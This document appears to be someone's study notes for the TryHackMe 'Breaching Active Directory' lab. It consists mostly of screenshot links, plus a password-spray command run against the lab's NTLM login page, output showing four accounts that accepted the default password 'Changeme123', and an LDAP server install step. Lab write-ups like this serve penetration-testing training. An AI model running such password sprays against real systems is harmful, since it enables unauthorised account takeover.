### 25072023Tue

[TryHackMe | Breaching Active Directory](https://tryhackme.com/room/breachingad)

https://tryhackme.com/room/adenumeration

```
This network covers techniques and tools that can be used to acquire that first set of AD credentials that can then be used to enumerate AD.
```

![[Pasted image 20230725143900.png]]

![[Pasted image 20230725144838.png]]

http://ntlmauth.za.tryhackme.com/

![[Pasted image 20230725151419.png]]

![[Pasted image 20230725151526.png]]

![[Pasted image 20230725151648.png]]

THMDC
```
10.200.4.101
```

![[Pasted image 20230725152158.png]]

![[Pasted image 20230725152341.png]]

```
sudo systemctl restart NetworkManager
```

![[Pasted image 20230725152614.png]]

![[Pasted image 20230725152655.png]]

![[Pasted image 20230725152723.png]]

![[Pasted image 20230725153251.png]]

```
python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
```

```
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: samantha.thompson
[-] Failed login with Username: dawn.turner
[-] Failed login with Username: frances.chapman
[-] Failed login with Username: henry.taylor
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[-] Failed login with Username: louise.talbot
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[-] Failed login with Username: dominic.elliott
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[-] Failed login with Username: alan.jones
[-] Failed login with Username: frank.fletcher
[-] Failed login with Username: maria.sheppard
[-] Failed login with Username: sophie.blackburn
[-] Failed login with Username: dawn.hughes
[-] Failed login with Username: henry.black
[-] Failed login with Username: joanne.davies
[-] Failed login with Username: mark.oconnor
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
[*] Password spray attack completed, 4 valid credential pairs found
```

![[Pasted image 20230725153638.png]]

![[Pasted image 20230725155644.png]]

http://printer.za.tryhackme.com/settings.aspx

![[Pasted image 20230725154742.png]]

![[Pasted image 20230725155233.png]]

```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

![[Pasted image 20230725160407.png]]

![[Pasted image 20230725160438.png]]

